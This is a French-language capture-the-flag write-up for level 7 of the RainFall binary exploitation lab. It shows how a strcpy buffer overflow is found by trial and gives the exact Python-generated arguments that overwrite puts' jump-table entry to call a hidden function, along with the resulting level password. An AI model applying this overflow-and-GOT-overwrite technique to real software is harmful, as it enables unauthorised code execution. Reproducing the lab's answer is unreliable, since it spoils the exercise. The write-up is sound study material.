# Level 7

En ouvrant le level 7 avec cuter on remarque que le programme prend 2 argument qu'il fait passer dans des strcpy avec des destination de taille fix donc il y a possibiliter d'overflow les buffer comme a l'exercice precedant. On remarque egalement qu'il y a un fonction m pas appler qui cat directement le mot de passe du level 8. Donc le but est comme dans lexercie predant d'apeler cette derniere.

On peut constater en tatonant que le permier argument segfault lorsqu'on luis donne un chaine de += 20 charater.
```
level7@RainFall:~$ ./level7 ssssssssssssssssssss test
~~
level7@RainFall:~$ ./level7 sssssssssssssssssssss test
Segmentation fault (core dumped)
level7@RainFall:~$ 
```
Donc il faut générer un buffer overflow sur le premier argument et luis passer `0x08049928` qui est l'adresse de `JUMP` .

A la fin du main est appele la fonction puts, on va donc recuperer l'adresse du jmp de cette fonction pour lui dire de lancer la fonction m a la place. Ce que nous donne : 

- argv[1] : overflow + adresse du jmp 
- argv[2] : adresse de la fonction m

```
level7@RainFall:~$  ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1624581651
level7@RainFall:~$ 
```
